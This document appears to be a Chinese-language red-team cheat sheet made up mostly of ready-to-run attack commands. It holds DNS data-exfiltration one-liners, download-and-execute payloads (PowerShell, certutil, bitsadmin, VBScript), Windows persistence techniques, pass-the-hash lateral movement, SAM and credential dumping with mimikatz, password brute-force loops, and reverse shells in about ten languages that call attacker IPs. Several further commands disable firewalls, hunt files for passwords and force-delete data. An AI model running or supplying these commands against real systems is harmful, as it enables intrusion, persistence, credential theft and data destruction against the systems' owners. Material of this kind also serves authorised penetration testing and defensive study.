ping pwd|tr -d '\n'|xxd -ps.is1lv6.ceye.io
```
base64原理和上面类似，主要是对值进行base64编码，然后替换掉“=”，即可成功外带数据。
```
pingpwd|base64|tr -d ‘=’.is1lv6.ceye.io
```
如果有多行数据需要外带，那么请考虑下面的语句。
```
var=11111 && for b in $(find / -name "index.php" | xargs grep "111222"|xxd -p); do var=$((var+1)) && dig $var.$b.is1lv6.ceye.io; done
```

## windows短文件名
短文件名查看
```
用"dir /x"命令可以方便地帮助您查看系统对目录或文件名的缩写
```
常见短文件名
```

Documents and Settings
可表示为
DOCUME~1
又如：
Local Settings
可表示为
LOCALS~1

Program Files
Program Files (x86)
这两个目录分别表示为：
PROGRA~1
PROGRA~2
```




## powershell文件下载

```
powershell (new-object System.Net.WebClient).DownloadFile('http://192.168.1.1/1.exe','C:\test\1.exe');start-process 'C:\test\1.exe'
```
常用
```
powershell (new-object System.Net.WebClient).DownloadFile('http://192.168.1.1/1.exe','1.exe')
```

```
Invoke-Expression (New-Object Net.WebClient).DownloadString("http://xxx.xx.xx.xx/test.ps1")
```

bypass

```
echo (new-object System.Net.WebClient).DownloadFile('http://192.168.31.93:8000/tomcat.exe','C:/Users/test/cc.exe')| powershell -
```

base64编码(和其他base64不同，解不开)
```
$Text = "(new-object System.Net.WebClient).DownloadFile('http://xxxxxxxxxx:8000/bddch.txt','bdchd.txt')"
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText =[Convert]::ToBase64String($Bytes)
$EncodedText
```
base64解码
```
$EncodedText = "dwByAGkAxxxxxxxxxxxxxxxxxxxAG0AbgB0AG4AJwA="
$DecodedText = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($EncodedText))
$DecodedText

```
运行base64编码后的命令
```
powershell -noP -sta -enc xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```




## certutil.exe下载

```
C:\Windows\System32\certutil.exe C:\Users\Public\cer.exe
```

```
certutil.exe -urlcache -split -f http://192.168.1.1/1.exe
```

```
certutil.exe -urlcache -split -f http://192.168.1.1/1.txt 1.exe
```

```
certutil.exe -urlcache -split -f http://192.168.6.27:8012/download/f.ext C:\windows\temp\up.exe &&start C:\windows\temp\up.exe
```

删除缓存

```
certutil.exe -urlcache -split -f http://192.168.1.1/1.exe delete
```

查看缓存项目：

```
certutil.exe -urlcache *
```

转为base64

```
certutil -encode lcx64.exe lcx64.txt
```

转回来

```
certutil -decode lcx64.txt lcx64.exe
```

查看md5

```
certutil -hashfile a.exe MD5
```

bypass

```
Certutil & Certutil –urlcache –f –split url
Certutil | Certutil –urlcache –f –split url
```

## bitsadmin

**不支持https、ftp协议，php python带的服务器会出错**

```
bitsadmin /transfer n http://192.168.1.1/1.exe  C:\test\update\1.exe
```

## wget 下载文件
下载到指定目录
```
wget -P /tmp http://127.0.0.1:8088/aliyun
```

## curl 下载
使用内置option：-o(小写)
```
curl -o dodo1.jpg http:www.linux.com/dodo1.JPG
```
使用内置option：-O（大写)
```
curl -O http://www.linux.com/dodo1.JPG
```

下载后，上线
```
chmod +x /tmp/aliyun&&/tmp/aliyun
```
```
manifest = "<?xml version=""1.0"" encoding=""UTF-16"" standalone=""yes""?>"
manifest = manifest & "<assembly manifestVersion=""1.0"" xmlns=""urn:schemas-microsoft-com:asm.v1"">"
manifest = manifest & "<assemblyIdentity name=""System"" version=""4.0.0.0"" publicKeyToken=""B77A5C561934E089"" />"
manifest = manifest & "<clrClass clsid=""{7D458845-B4B8-30CB-B2AD-FC4960FCDF81}"" progid=""System.Net.WebClient"" threadingModel=""Both"" name=""System.Net.WebClient"" runtimeVersion=""v4.0.30319"" />"
manifest = manifest & "</assembly>"

Set ax = CreateObject("Microsoft.Windows.ActCtx")
ax.ManifestText = manifest

Set sNetClient = ax.CreateObject("System.Net.WebClient")
webstuff = sNetClient.DownloadFile("http://www.a.com/calc.exe", "d:/calc.exe")

wsh.echo webstuff

```

```
Dim Shell
Set Shell = GetObject("new:72C24DD5-D70A-438B-8A42-98424B88AFB8")
Shell.Run "cmd /c calc.exe"

```

```
icacls %cd% /deny %username%:(OI)(CI)(DE,DC)
set tmp=%cd%
echo [Connection Manager] > settings.txt
echo CMSFile=settings.txt >> settings.txt
echo ServiceName=WindowsUpdate >> settings.txt
echo TunnelFile=settings.txt  >> settings.txt
echo [Settings]  >> settings.txt
echo UpdateUrl=http://10.211.55.2:8000/mimikatz.exe  >> settings.txt

cmdl32 /vpn /lan %cd%\settings.txt
icacls %cd% /remove:d %username%
move VPNBDFF.tmp mimikatz.exe
```


## windows权限维持

### Startup目录
```
NT6以后的目录如下：

对当前用户有效：
C:\Users\Username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
对所有用户有效：
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
NT6以前的目录如下：

对当前用户有效：
C:\Documents and Settings\Hunter\「开始」菜单\程序\启动
对所有用户有效：
C:\Documents and Settings\All Users\「开始」菜单\程序\启动

```
### 注册键

```
reg add "XXXX" /v evil /t REG_SZ /d "[Absolute Path]\evil.exe"

```

```
1.Load注册键
HKEY_CURRENT_USER＼Software＼Microsoft＼Windows NT＼CurrentVersion＼Windows＼load

2.Userinit注册键
HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows NT＼CurrentVersion＼Winlogon＼Userinit
通常该注册键下面有一个userinit.exe。该键允许指定用逗号分隔的多个程序，如userinit.exe,evil.exe。

3.Explorer＼Run注册键
Explorer＼Run键在HKEY_CURRENT_USER和HKEY_LOCAL_MACHINE下都有。
HKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼Policies＼Explorer＼Run
HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼CurrentVersion＼Policies＼Explorer＼Run
Explorer＼Run键在HKEY_CURRENT_USER和HKEY_LOCAL_MACHINE下都有。

4.RunServicesOnce注册键
RunServicesOnce注册键用来启动服务程序，启动时间在用户登录之前，而且先于其他通过注册键启动的程序，在HKEY_CURRENT_USER和HKEY_LOCAL_MACHINE下都有。
HKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼RunServicesOnce
HKEY_LOCAL_MACHINE＼Software＼Microsoft＼ Windows＼CurrentVersion＼RunServicesOnce

5.RunServices注册键
RunServices注册键指定的程序紧接RunServicesOnce指定的程序之后运行，但两者都在用户登录之前。
HKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼ RunServices
HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼ CurrentVersion＼RunServices

6.RunOnce＼Setup注册键
HKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼RunOnce＼Setup
HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼CurrentVersion＼RunOnce＼Setup

7.RunOnce注册键
安装程序通常用RunOnce键自动运行程序，它的位置在
HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼CurrentVersion＼RunOnce
[小于NT6]HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼CurrentVersion＼RunOnceEx
HKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼RunOnce
HKEY_LOCAL_MACHINE下面的RunOnce键会在用户登录之后立即运行程序，运行时机在其他Run键指定的程序之前；HKEY_CURRENT_USER下面的RunOnce键在操作系统处理其他Run键以及“启动”文件夹的内容之后运行。

8.Run注册键
HKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼Run
HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼CurrentVersion＼Run
Run是自动运行程序最常用的注册键，HKEY_CURRENT_USER下面的Run键紧接HKEY_LOCAL_MACHINE下面的Run键运行，但两者都在处理“启动”文件夹之前。
```

### 服务
```
sc create evil binpath= "cmd.exe /k [Absolute Path]evil.exe" start= "auto" obj= "LocalSystem"
```

### 计划任务

```
SCHTASKS /Create /RU SYSTEM /SC ONSTART /RL HIGHEST /TN \Microsoft\Windows\evil\eviltask /TR C:\Users\hunter\Desktop\evil.exe
```

### WMI事件

```
wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="evil", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 310"

wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="evilConsumer", ExecutablePath="C:\Users\hunter\Desktop\beacon.exe",CommandLineTemplate="C:\Users\hunter\Desktop\beacon.exe"

wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"evil\"", Consumer="CommandLineEventConsumer.Name=\"evilConsumer\""

```

### 屏幕保护

```
reg add "hkcu\control panel\desktop" /v SCRNSAVE.EXE /d C:\Users\hunter\Desktop\beacon.exe /f
reg add "hkcu\control panel\desktop" /v ScreenSaveActive /d 1 /f
reg add "hkcu\control panel\desktop" /v ScreenSaverIsSecure /d 0 /f
reg add "hkcu\control panel\desktop" /v ScreenSaveTimeOut /d 60 /f
```

### bitsadmin
```
bitsadmin /create evil
bitsadmin /addfile evil "C:\Users\hunter\Desktop\beacon.exe" "C:\Users\hunter\Desktop\beacon.exe"
bitsadmin.exe /SetNotifyCmdLine evil "C:\Users\hunter\Desktop\beacon.exe" NUL
bitsadmin /Resume evil
```

### Netsh白加黑

```
可以通过导入helperdll的方式做权限维持，命令格式如下：
netsh add helper [Absolute evil DLL path]
但是由于netsh并不会开启自启动，因此还要再写一条自启动项：
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v Pentestlab /t REG_SZ /d "cmd /c C:\Windows\System32\netsh"
重新启动后依然可获得shell：
```

### MSDTC

在默认的Windows安装中，System32文件夹中缺少oci.dll这个文件，在获得写权限的情况下可以在该文件夹下写入一个同名的dll，服务启动时执行恶意代码。
默认情况下，由于启动类型设置为“手动”，通过以下命令设置自启：
```
sc qc msdtc
sc config msdtc start= auto

```


## windows信息收集常用命令
```
Systeminfo 计算机详细信息(补丁信息)

Net start 所启动的服务

Wmic service list brief 查询本机服务信息

Tasklist 进程列表

Wmic startup get command,caption 查看启动该程序信息

Schtasks /query /fo LIST /v计划任务

Netstat -ano 根据本机端口开放情况来判断有什么服务、其角色

Query user || qwinsta 查看当前在线用户

Net session 列出会话

Net share 查看本机的共享列表

Wmic share get name,path,status 查看共享列表

Net user 本地用户

Net user kkkk 查看本地用户信息


Net localgroup 本地用户组

Net localgroup /domain 域用户组

Net localgroup adminnstrators 本地管理员组成员

net localgroup adminstrators /domain 查看登陆过主机的管理员

Wmic useraccount get /all 获取域内用户详细信息

dsquery user 查看存在的用户

Net user /domain 域用户信息

Net user kkkk /domain 域用户kkkk信息

Net user kent password /add /domain添加域用户


Net group /domain 域用户组信息

Net view /domain 查询域

Net view /domain:test 查询域内计算机

Net accounts /domain 查询域中密码策略

Net group /domain 查看域内所有用户组

Net group "Domain Controllers" /domain 查看域控制器组

Net group "Domain computers" /domain 查看域内所有计算机列表

Net group "Domain admins" /domain 查看域内管理员用户

Net user /domain kent active:yes 启用域账户

Net user /domain kent active:no 禁用域账户

Nltest /DCLIST:test 查看域中域控制器名

Wmic useraccount get /all 用户详细信息

Net group "Domain Admins" /domain 对应组下的账户信息

nltest /domain_trusts 获取域信任信息

net config workstation 了解本机的配置信息

Netsh firewall show config 查看防火墙配置

Netsh advfirewall set allprofiles state off关闭防火墙(windows server 2003后)

Netsh advfirewall firewall add rule name="pass nc" dir=in action=allow program="C:\nc.exe" 允许指定程序进入(windows server 2003后)

Netsh advfirewall firewall add rule name="allow nc" dir=out action=allow program="C:\nc.exe"允许指定程序退出(windows server 2003后)

Netsh advfirewall firewall add rule name="Remote Desktop" protocol=TCP dir=in localport=3389 action=allow 允许3389连接(windows server 2003后)

Reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings"查看端口代理配置信息

Reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /V PortNumber 查看远程桌面端口号

```

## at&schtasks&sc横向

使用明文密码登录到目标，需要445和139端口开启：
```
net use \\192.168.2.148\ipc$ password /user:test\administrator

net use \\192.168.2.148\ipc$ password /user:administrator

复制文件
copy c:\1.exe \\192.168.2.148\c$

at新建10:10分运行的定时作业
at \\192.168.2.148 10:10 c:\1.exe

Windows server 2012及以上使用schtasks命令
Schtasks /create /s 192.168.2.148 /ru “SYSTEM” /tn executefile /sc DAILY /tr c:/1.exe /F
Schtasks /run /s 192.168.2.148 /tn executefile /i
Schtasks /delete /s 192.168.2.148 /tn executefile /f

sc \\192.168.210.107 create hacker binpath="c:\shell1.exe"   #创建服务
sc \\192.168.210.107 start hacker      #启动hacker服务
```

## impacket包横向命令

下载https://github.com/maaaaz/impacket-examples-windows     
https://github.com/ropnop/impacket_static_binaries/releases   
Atexec
```
需要445端口开启
Atexec.exe hacker/administrator:abc123@192.168.202.148 "whoami"

Atexec.exe -hashes :fac5d668099409cb6fa223a32ea493b6 hacker/administrator@192.168.202.148 "whoami"
```


dcomexec
```
需要135端口开启
dcomexec.exe hacker/administrator:abc123@192.168.202.148 "whoami"

dcomexec.exe -hashes :fac5d668099409cb6fa223a32ea493b6 hacker/administrator@192.168.202.148 "whoami"
```

psexec
```
官方Psexec第一种利用方法：可以先有ipc链接，再用psexec运行相应的程序：
Net use \192.168.202.148\ipc$ zxcvbnm123 /user:test\Administrator
Psexec \192.168.202.148 -accepteula -s cmd

官方Psexec第二种利用方法：不用建立ipc连接，直接使用密码或hash进行传递
Psexec \192.168.202.148 -u Administrator -p zxcvbnm123 -s cmd

PsExec -hashes :fac5d668099409cb6fa223a32ea493b6 test.com/Administrator@192.168.202.148 "whoami" (官方提供的exe执行不了)
```

smbexec
```
需要445端口开启
Smbexec test/Administrator:zxcvbnm123@192.168.202.148
Smbexec -hashes :fac5d668099409cb6fa223a32ea493b6 test/Administrator@192.168.202.148
```

wmi
```
WMI利用135端口，支持明文和hash两种方式进行身份验证，且系统日志不记录。
第一种：使用系统自带的WMIC明文传递执行相应命令，但执行的结果不回显（先管理员账户登录）
Wmic /node:192.168.202.148 /user:Administrator /password:zxcvbnm123 process call create "cmd.exe /c ipconfig >C:/1.txt"

第二种：使用系统自带cscript明文传递执行反弹shell，执行结果有回显，现已被杀
Cscript //nologo wmiexec.vbs /shell 192.168.202.148 Administrator zxcvbnm123

第三种：使用第三方impacket套件中的Wmiexec进行明文或hash传递，执行结果有回显
Wmiexec test/Administrator:zxcvbnm123@192.168.202.148 "whoami"
Wmiexec -hashes :fac5d668099409cb6fa223a32ea493b6 test/Administrator@192.168.202.148 "whoami"

```

批量操作,需要保存为bat执行
```
用已知密码和用户，批量连接ip:
FOR /F %%i in (ips.txt) do net use \%%i\ipc$ “password” /user:hacker\administrator

已知用户和ip，批量连接密码(爆破密码)：
FOR /F %%i in (pass.txt) do net use \192.168.202.148\ipc$ "%%i" /user:test\administrator

已知用户和ip，批量连接hash(爆破hash)：
FOR /F %%i in (hash.txt) do atexec.exe -hashes :"%%i" test/administrator@192.168.202.148 "whoami"
```
精准批量法
```
shell for /l %i in (1,1,253) do echo 172.22.13.%i >>tip.txt
shell for /f %i in (tip.txt) do ping -n 1 -w 10 %i | find /i "ttl" >nul && echo %%i >>ok.tx
shell for /f %i in (ok.txt) do dir \\%i\c$\users >>result.txt
```

cme 批量
```
proxychains4 ./cme smb 10.0.0.1/24 -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 -d xx.org -x "net user"
```

单独执行命令
```
crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x whoami
```
ldap喷洒
```
cme ldap 10.11.12.211 -u 'username' -p 'password' --kdcHost 10.11.12.211 --users
```
windows 抓hash
```
reg save HKLM\SYSTEM sys.hiv 
reg save HKLM\SAM sam.hiv
reg save hklm\security security.hiv
mimikatz.exe “lsadump::sam /system:sys.hiv /sam:sam.hiv” exit

python /root/impacket/examples/secretsdump.py -sam sam.hiv -security security.hiv -system sys.hiv LOCAL


```
#cobaltstrike linux geacon 马儿 
```
https://github.com/TheKingOfDuck/geacon
https://github.com/Z3ratu1/geacon_plus
https://github.com/testxxxzzz/geacon_pro
```
## 反弹shell

## nc

```
nc -lvvp 4444
```

## bash

```
bash -i >& /dev/tcp/172.16.1.130/4444 0>&1
exec 5<>/dev/tcp/172.16.1.130/4444;cat <&5|while read line;do $line >&5 2>&1;done
```

## perl

```
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

## python

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.31.41",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

## php

```
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

## ruby

```
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

## nc

```
nc -e /bin/sh 10.0.0.1 1234
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
nc x.x.x.x 8888|/bin/sh|nc x.x.x.x 9999
```

## java

```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

## lua

```
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
```

## powershell

```
powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 172.16.1.130 -port 4444
```

## 加密shell
```
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 192.168.0.100:2333 > /tmp/s; rm /tmp/s

```


## 安装

安装

```bash
# 安装
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall
安装目录 
# /opt/metasploit-framework/embedded/framework/
```

安装2
```
wget http://downloads.metasploit.com/data/releases/metasploit-latest-linux-x64-installer.run
chmod +x ./metasploit-latest-linux-x64-installer.run
./metasploit-latest-linux-x64-installer.run
```

```
https://download.sysinternals.com/files/SysinternalsSuite.zip

查看域控制器
net group "Domain controllers"

查询所有计算机名称(windows 2003)

dsquery computer

下面这条查询的时候,域控不会列出

net group "Domain Computers" /domain

net group /domain	//获得所有域用户组列表
net group qq_group /domain	//显示域中qq_group组的成员
net group qq_group /del /domain	//删除域中qq_group组
net group qq_group qq /del /domain	//删除域内qq_group 群组中的成员QQ
net group qq_group /add /domain	//增加域中的群组
net group "domain admins" /domain	//获得域管理员列表
net group "enterprise admins" /domain	//获得企业管理员列表
net localgroup administrators /domain	//获取域内置administrators组用（enterprise admins、domain admins）
net group "domain controllers" /domain	//获得域控制器列表
net group "domain computers" /domain	//获得所有域成员计算机列表
net user /domain	//获得所有域用户列表
net user someuser /domain	//获得指定账户someuser的详细信息
net accounts /domain	//获得域密码策略设置，密码长短，错误锁定等信息
net view /domain	//查询有几个域, 查询域列表
net view /domain:testdomain	//查看 testdomain域中的计算机列表
nltest /domain_trusts	//获取域信任信息
net user domain-admin /domain	//查看管理员登陆时间，密码过期时间，是否有登陆脚本，组分配等信息
net config Workstation	//查询机器属于哪个域
net time /domian	//查询主域服务器的时间
echo %logonserver%	//查看登陆到这台服务器的计算机名
net time  \\192.168.1.1	//查询远程共享主机192.168.1.1的时间
net use \\IP\ipc$ password /user:username@domain	//ipc$域内连接
net  view  \\dc2.backlion.com	//查看域控共享情况
dir \\dc2.backlion.com\SYSVOL /s /a > sysvol.txt	//列出sysvol日志记录
xcopy \\dc2.backlion.com\sysvol.txt sysvol.txt  /i  /e  /c	//远程拷贝到本地sysvol日志
net user  /domain  bk bk123	//修改域内用户密码，需要管理员权限
net  localgroup  administartors   SEZKL\backlion  /add	//将SEZKL域中的用户backlion添加到administrators组中
mstsc /admin	//远程桌面登录到console会话解决hash无法抓出问题
gpupdate/force	//更新域策略
psexec \\192.168.1.3 -u administrator -p bk1234 -c gsecdump.exe -u	//从域服务器密码存储文件windows/ntds/ntds.dit导出hash值出来
gsecdump  -a	//获取域登管理员登录过得hash值，这里gescdump为第三方导出AD域的hash值
tasklist /S ip /U domain\username /P /V	//查看远程计算机进程列
net accounts	查看本地密码策略
net accounts /domain	查看域密码策略
query user   查看当前的登录信息
netsh firewall show config	查看防火墙策略
netsh firewall show state	查看防火墙策略
route print	路由表
tracert IP	路由跟踪
arp -a	列出本网段内所有活跃的IP地址
arp -s (ip + mac)	绑定mac和IP
arp -d (iP + mac)	解绑IP和Mac
tasklist /V	查看进程[显示对应用户]
tasklist /S ip /U domain\username /P /V	查看远程计算机进程列表
tasklist /S IP地址 /U 域名\用户名 /P /V	查看远程计算机进程
tasklist /svc	查看进程
taskkill /im 进程名称(cmd.exe)	结束进程
taskkill /pid[进程码]	-t(结束该进程) -f(强制结束该进程以及所有子进程)
qprocess *	类似tasklist
qprocess /SERVER:IP	远程查看计算机进程列表
whoami /all	查询当前用户权限等
set	查看系统环境变量
systeminfo	查看系统信息
qwinsta	查看登录情况
fsutil fsinfo drives	查看所有盘符
wmic bios	查看bios信息
wmic qfe	查看补丁信息
wmic qfe get hotfixid	查看补丁-Patch号，很实用
wmic share get name,path	查看SMB指向路径
net view /domain
net config workstation
net group "Domain Admins" /domain
net time /domain
ipconfig /all
nslookup xxx
dsquery server

 
 
 
2.基本内网渗透命令：
ipconfig/all	//查看IP地址
ipconfig /release	//释放地址
ipconfig /renew	重新获取Ip地址
whoami	//查询账号所属权限
whoami/all	//查看sid值
systeminfo	//查询系统以及补丁信息
tasklist /svc	//查看进程
taskkill /im 进程名称(cmd)	//结束进程
taskkill /pid[进程码] -t(结束该进程) -f(强制结束该进程以及所有子进程)
wmic qfe  get hotfixid	//查看已安装过得补丁，这个很实用
wmic qfe list full /format:htable > hotfixes.htm	//详细的补丁安装
wmic  qfe	//查询补丁信息以及微软提供的下载地址
ping hostname(主机名）	//显示该机器名的IP
net start	//查看当前运行的服务
net user	//查看本地组的用户
net localhroup administrators	//查看本机管理员组有哪些用户
net user	//查看会话
net session	//查看当前会话
net share	//查看SMB指向的路径[即共享]
wmic share get name,path	//查看SMB指向的路径
wmic nteventlog get path,filename,writeable	//查询系统日志文件存储位置
net use \\IP\ipc$  password  /user:username	//建立IPC会话（工作组模式）
net use  z:  \\192.168.1.1	//建立映射到本机Z盘
net time \\172.16.16.2	//查询共享主机的是
at \\172.16.16.2 13:50 c:\windows\2009.exe	//在共享主机上执行
netstat  -ano	//查看开放的端口
netstat -an | find “3389”	//找到3389端口
net accounts	//查看本地密码策略
nbtstat –A ip	//netbiso查询
net view	//查看机器注释或许能得到当前活动状态的机器列表，如果
禁用netbios就查看不出来
echo %PROCESSOR_ARCHITECTURE%	//查看系统是32还是64位 
set	//查看系统环境设置变量
net start	//查看当前运行的服务
wmic process get name,executablepath //查看路径
wmic service list brief	//查看进程服务
wmic process list brief	//查看进程
wmic startup list brief	//查看启动程序信息
wmic product list brief	//查看安装程序和版本信息（漏洞利用线索）
wmic startup list full	//识别开机启动的程序
wmic process where(description="mysqld.exe")
 >>mysql.log	//获取软件安装路径
for /f "skip=9 tokens=1,2 delims=:" %i in ('ne
tsh wlan showprofiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %jkey=clear	//一键获取wifi密码
if defined PSModulePath (echo 支持powershell) else (echo 不支持powershell)	//查看是否支持posershell
qwinsta	//查看登录情况
schtasks.exe  /Create /RU"SYSTEM" /SC MINUTE /MO 45 /TN FIREWALL /TR "c:/muma.ex    e" /ED 2017/4/7	//添加计划任务
set KB2829361=MS13-046&set KB2830290=MS13-046&setKB2667440=MS12-020&set KB2667402=MS12-020&set KB3124280=MS16-016&setKB3077657=MS15-077&set KB3045171=MS15-051&setKB2592799=MS11-080&set KB952004=MS09-012 PR&set KB956572=MS09-012 巴西烤肉&set KB970483=MS09-020 iis6&set KB2124261=MS10-065 ii7&setKB2271195=MS10-065 ii7&systeminfo>a.txt&(for %i in (KB952004 KB956572KB2393802 KB2503665 KB2592799 KB2621440 KB2160329 KB970483 KB2124261 KB977165KB958644 KB2667402 KB2667440 KB2830290 KB2829361 KB3045171 KB3077657 KB3124280)do @type a.txt|@find /i "%i"||@echo %%i% Not Installed!)&del /f/q /a a.txt	//windows未打补丁情况
REG query HKCU  /v "pwd" /s	//获取保存到注册表中的密码
 
 
 
 
3.内网网络结常用命令：
tracert IP	//路由跟踪
route print	//打印路由表
arp -a	//列出本网段内所有活跃的IP地址
arp -s （ip + mac）	//绑定mac与ip地址
arp -d （ip + mac）	//解绑mac与ip地址
nbtscan -r 192.168.16.0/24	//通过小工具nbtscan扫描整个网络
netsh firewall show config	//查看防火墙策略
netsh firewall show state	//查看防火墙策略
开启防火墙：
netsh firewall set opmode mode=enable
关闭防火墙：
netsh firewall set opmode mode=disable
netsh firewall show allowedprogram //查看防火墙放行的程序
netsh firewall show state
netsh advfirewall show allprofiles

详细命令：netsh firewall 
参数： 
? // 显示命令列表 
add // 添加防火墙配置 
delete // 删除防火墙配置 
dump // 显示一个配置脚本 
help // 显示命令列表 
reset // 将防火墙配置重置为默认值。 
set // 设置防火墙配置 
show // 显示防火墙配置 
add allowedprogram // 添加防火墙允许的程序配置。 
add portopening // 添加防火墙端口配置 
delete allowedprogram // 删除防火墙允许的程序配置 
delete portopening // 删除防火墙端口配置 
set allowedprogram // 设置防火墙允许的程序配置 
set icmpsetting // 设置防火墙 ICMP 配置 
set logging // 设置防火墙记录配置 
set multicastbroadcastresponse // 设置防火墙多播/广播响应配置 
set notifications // 设置防火墙通知配置 
set opmode // 设置防火墙操作配置 
set portopening // 设置防火墙端口配置 
set service // 设置防火墙服务配置 
show allowedprogram // 显示防火墙允许的程序配置 
show config // 显示防火墙配置。 
show currentprofile // 显示当前防火墙配置文件 
show icmpsetting // 显示防火墙 ICMP 配置 
show logging // 显示防火墙记录配置 
show multicastbroadcastresponse // 显示防火墙多播/广播响应配置 
show notifications // 显示防火墙操作配置 
show opmode // 显示防火墙端口配置 
show portopening // 显示防火墙端口配置 
show service // 显示防火墙服务配置 
show state // 显示当前防火墙状态

netsh firewall set portopening TCP 445 ENABLE //打开445端口 
netsh firewall set portopening TCP 3389 ENABLE // 
netsh firewall delete allowedprogram C:\A.exe //删除放行程序A.exe 
netsh firewall set allowedprogram C:\A.exe A ENABLE //添加程序C盘下的A.exe并放行 
netsh firewall add allowedprogram C:\A.exe A ENABLE //添加程序C盘下的A.exe并放行
netsh firewall set icmpsettting type=ALL mode=enable //开启ICMP协议 
netsh firewall set icmpsettting type=2 mode=enable  //允许出站数据包太大


for /l %i in (1,1,255) do @ping 10.0.0.%i -w 1 -n 1 | find /i"ttl"	//批量扫描内网存活主机
 
 
windows自带端口转发：
netsh interface ipv6 install	//首先安装IPV6（xp、2003下IPV6必须安装，否则端口转发不可用！）
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=22connectaddress=1.1.1.1 connectport=22	//将本机22到1.1.1.1的22
netsh interface portproxy add v4tov4 listenaddress=192.168.193.1listenport=22 connectaddress=8.8.8.8 connectport=22	
netsh interface portproxy add v4tov4 listenaddress=192.168.193.1listenport=22 connectaddress=www.baidu.com connectport=22	
netsh interface portproxy show all	// 查看转发配置
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0listenport=22	//删除配置
netsh firewall set portopening protocol=tcp port=22 name=Forwardmode=enable scope=all profile=all	//添加防火墙规则，允许连接22：
 
 
4.敏感数据和目录：

dir /a /s /b c:"*.docx"
dir /a /s /b c:"*.pdf"


dir /a /s /b d:"*.xml"
dir /a /s /b d:"*.mdb"
dir /a /s /b d:"*.sql"
dir /a /s /b d:"*.mdf"
dir /a /s /b d:"*.eml"
dir /a /s /b d:"*.pst"
dir /a /s /b d:"*conf*"
dir /a /s /b d:"*bak*"
dir /a /s /b d:"*pwd*"
dir /a /s /b d:"*pass*"
dir /a /s /b d:"*login*"
dir /a /s /b d:"*user*"
2.指定目录下的文件中搜集各种账号密码
findstr /si pass *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak
findstr /si userpwd *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak
findstr /si pwd *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak
findstr /si login *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak
findstr /si user *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak
3.查看,删除 指定文件
type c:\windows\temp\admin_pass.bak 查看某个文件内容
del d:\ad\*.* /a /s /q /f             强制删除指定路径下的所有文件
tree /F /A D:\ >> file_list.txt     导出指定路径下的文件目录结构
